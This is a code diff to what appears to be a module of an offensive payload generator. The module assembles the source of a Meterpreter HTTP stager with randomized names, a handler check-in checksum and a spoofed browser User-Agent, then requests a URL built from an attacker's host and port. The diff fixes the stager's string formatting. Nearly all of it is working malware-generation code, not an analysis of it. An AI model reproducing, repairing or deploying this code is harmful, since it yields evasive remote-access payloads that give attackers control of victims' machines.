@@ -77,7 +77,6 @@ class PayloadModule:
         # How I'm tracking the number of nested tabs needed
         # to make the payload
         num_tabs_required = 0
-        payload_code = ''
 
         if self.required_options["EXPIRE_PAYLOAD"][0].lower() != "x":
 
@@ -142,7 +141,7 @@ class PayloadModule:
             num_tabs_required += 1
 
         # helper method that returns the sum of all ord values in a string % 0x100
-        payload_code += '\t' * num_tabs_required + "def " + sumMethodName + "(s): return sum([ord(ch) for ch in s]) %% 0x100\n"
+        payload_code += '\t' * num_tabs_required + "def " + sumMethodName + "(s): return sum([ord(ch) for ch in s]) % 0x100\n"
 
         # method that generates a new checksum value for checkin to the meterpreter handler
         payload_code += '\t' * num_tabs_required + "def " + checkinMethodName + "():\n\tfor x in range(64):\n"
@@ -156,7 +155,7 @@ class PayloadModule:
         payload_code += '\t' * num_tabs_required + "\t" + proxy_var + " = urllib.request.ProxyHandler({})\n"
         payload_code += '\t' * num_tabs_required + "\t" + opener_var + " = urllib.request.build_opener(" + proxy_var + ")\n"
         payload_code += '\t' * num_tabs_required + "\turllib.request.install_opener(" + opener_var + ")\n"
-        payload_code += '\t' * num_tabs_required + "\t" + requestName + " = urllib.request.Request(\"http://%%s:%%s/%%s\" %%(" + hostName + ", " + portName + ", " + checkinMethodName + "()), None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'})\n"
+        payload_code += '\t' * num_tabs_required + "\t" + requestName + " = urllib.request.Request(\"http://\" + " + hostName + " + \":\" + str(" + portName + ") + \"/\" + " + checkinMethodName + "(), None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'})\n"
         payload_code += '\t' * num_tabs_required + "\ttry:\n"
         payload_code += '\t' * num_tabs_required + "\t\t" + tName + " = urllib.request.urlopen(" + requestName + ")\n"
         payload_code += '\t' * num_tabs_required + "\t\ttry:\n"
